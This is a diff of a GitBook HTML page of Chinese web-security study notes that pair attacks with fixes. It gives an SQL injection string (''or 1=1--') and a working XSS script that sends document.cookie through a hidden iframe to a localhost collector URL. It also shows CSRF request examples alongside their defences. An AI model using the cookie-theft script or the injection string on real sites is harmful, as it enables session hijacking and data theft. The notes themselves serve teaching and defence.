@@ -48,7 +48,7 @@
     <body>
         
         
-    <div class="book" data-level="1" data-chapter-title="site security" data-filepath="site.md" data-basepath="." data-revision="Tue Jan 05 2016 01:23:21 GMT+0800 (CST)">
+    <div class="book" data-level="1" data-chapter-title="site security" data-filepath="site.md" data-basepath="." data-revision="Tue Jan 05 2016 23:03:16 GMT+0800 (CST)">
     
 
 <div class="book-summary">
@@ -156,22 +156,78 @@
                     
                         <h3 id="web-site-security">web site security</h3>
 <ol>
-<li>sql inject<pre><code>&apos;or 1=1--
+<li><p>sql inject</p>
+<pre><code>&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#xFF1A; &apos;or 1=1--
+&#x6539;&#x6B63;&#x65B9;&#x6CD5;&#xFF1A; sql&#x4F7F;&#x7528;&#x53C2;&#x6570;&#x5316;, &#x4E0D;&#x62FC;sql
 </code></pre></li>
-<li>csrf 
-```</li>
-<li>&#x6B63;&#x786E;&#x4F7F;&#x7528;http method, get , post, put, delete, options, head, patch, trace, connect</li>
-<li>escape input</li>
-<li>```</li>
-<li>xss  cross site scripting<pre><code>Auto Escape
-</code></pre></li>
+<li><p>xss cross site scripting</p>
+</li>
+</ol>
+<pre><code>&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#xFF1A; &#x653B;&#x51FB;&#x8005;&#x901A;&#x5E38;&#x4F1A;&#x5728;&#x6709;&#x6F0F;&#x6D1E;&#x7684;&#x7A0B;&#x5E8F;&#x4E2D;&#x63D2;&#x5165;JavaScript&#x3001;VBScript&#x3001;ActiveX&#x6216;Flash&#x4EE5;&#x6B3A;&#x9A97;&#x7528;&#x6237;&#x3002;&#x4E00;&#x65E6;&#x5F97;&#x624B;&#xFF0C;&#x4ED6;&#x4EEC;&#x53EF;&#x4EE5;&#x76D7;&#x53D6;&#x7528;&#x6237;&#x5E10;&#x6237;&#x4FE1;&#x606F;&#xFF0C;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x8BBE;&#x7F6E;&#xFF0C;&#x76D7;&#x53D6;/&#x6C61;&#x67D3;cookie&#x548C;&#x690D;&#x5165;&#x6076;&#x610F;&#x5E7F;&#x544A;&#x7B49;&#x3002;&#x7528; 
+
+&lt;script type=&quot;text/javascript&quot;&gt; 
+(function(window, document) {
+    // &#x6784;&#x9020;&#x6CC4;&#x9732;&#x4FE1;&#x606F;&#x7528;&#x7684; URL
+    var cookies = document.cookie;
+    console.log(&quot;cookes: &quot; + cookies);
+    var xssURIBase = &quot;http://localhost:9000/v2/xss?cookie=&quot;;
+    var xssURI = xssURIBase + window.encodeURI(cookies);
+    // &#x5EFA;&#x7ACB;&#x9690;&#x85CF; iframe &#x7528;&#x4E8E;&#x901A;&#x8BAF;
+    var hideFrame = document.createElement(&quot;iframe&quot;);
+    hideFrame.height = 0;
+    hideFrame.width = 0;
+    hideFrame.style.display = &quot;none&quot;;
+    hideFrame.src = xssURI;
+    // &#x5F00;&#x5DE5;
+    document.body.appendChild(hideFrame);
+})(window, document);
+&lt;/script&gt;
+
+&#x6539;&#x6B63;&#x65B9;&#x6CD5;&#xFF1A;escape input
+</code></pre><ol>
+<li>csrf Cross-site request forgery</li>
+</ol>
+<pre><code>&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#xFF1A;  http:xxx.com/posts?title=1212&amp;content=345345
+1. &#x6B63;&#x786E;&#x4F7F;&#x7528;http method, get , post, put, delete, options, head, patch, trace, connect
+
+&#x653B;&#x51FB;&#x5B9E;&#x4F8B;&#xFF1A; http post  register
+&#x6539;&#x6B63;&#x65B9;&#x6CD5;&#xFF1A; 1. &#x9A8C;&#x8BC1;&#x7801; 2. csrf token 3. &#x5173;&#x952E;&#x4E1A;&#x52A1;&#x91CD;&#x590D;&#x6570;&#x636E;&#x5BC6;&#x7801;
+
+ajax: &#x8DE8;&#x57DF;&#x5F00;&#x653E;&#x65F6;&#xFF0C;&#x7ED9;&#x51FA;&#x6709;&#x9650;&#x8BBF;&#x95EE;&#x7684;&#x767D;&#x540D;&#x5355;
+&#x6539;&#x6B63;&#x65B9;&#x6CD5;&#xFF1A; &#x7ED9;&#x51FA;&#x6709;&#x9650;&#x8BBF;&#x95EE;&#x7684;&#x767D;&#x540D;&#x5355;
+</code></pre><ol>
 <li>x-frame cfs</li>
-<li>cookie</li>
-<li>ajax
-&#x8DE8;&#x57DF;&#xFF0C;m.wuliusys.com</li>
+</ol>
+<pre><code>Using X-Frame-Options
+DENY
+The page cannot be displayed in a frame, regardless of the site attempting to do
+so.
+SAMEORIGIN
+The page can only be displayed in a frame on the same origin as the page itself.
+ALLOW-FROM uri
+The page can only be displayed in a frame on the specified origin.
+
+Nginx config 
+add_header X-Frame-Options SAMEORIGIN;
+</code></pre><ol>
 <li>Ddos</li>
 </ol>
-
+<h3 id="&#x52A0;&#x5F3A;&#x5B89;&#x5168;">&#x52A0;&#x5F3A;&#x5B89;&#x5168;</h3>
+<ol>
+<li><p>cookie</p>
+<pre><code>&#x52A0;&#x5BC6;
+</code></pre></li>
+<li><p>&#x4F7F;&#x7528;https</p>
+</li>
+<li><p>&#x5BC6;&#x7801;</p>
+</li>
+</ol>
+<pre><code>&#x5BC6;&#x7801;&#x52A0;&#x5BC6;
+</code></pre><ol>
+<li>&#x91CD;&#x590D;&#x63D0;&#x4EA4;</li>
+</ol>
+<pre><code>1. &#x91CD;&#x590D;&#x63D0;&#x4EA4;form &#x8868;&#x5355;  &#x4F7F;&#x7528;token
+</code></pre>
                     
                     </section>
                 
